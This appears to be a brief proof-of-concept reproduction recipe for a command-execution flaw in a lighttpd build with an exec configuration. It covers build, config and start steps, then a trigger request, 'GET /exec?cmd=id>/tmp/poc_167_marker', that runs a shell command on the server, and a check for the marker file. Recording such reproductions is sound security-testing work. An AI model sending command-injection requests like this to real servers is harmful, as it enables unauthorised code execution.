  build:   bash build.sh
  config:  exec_mode = 1\nexec_logging = 1  (in exec.conf)
  start:   ./lighttpd -f lighttpd.conf -D --exec-config /tmp/exec.conf
  trigger: python3 raw socket: GET /exec?cmd=id>/tmp/poc_167_marker
  verify:  cat /tmp/poc_167_marker
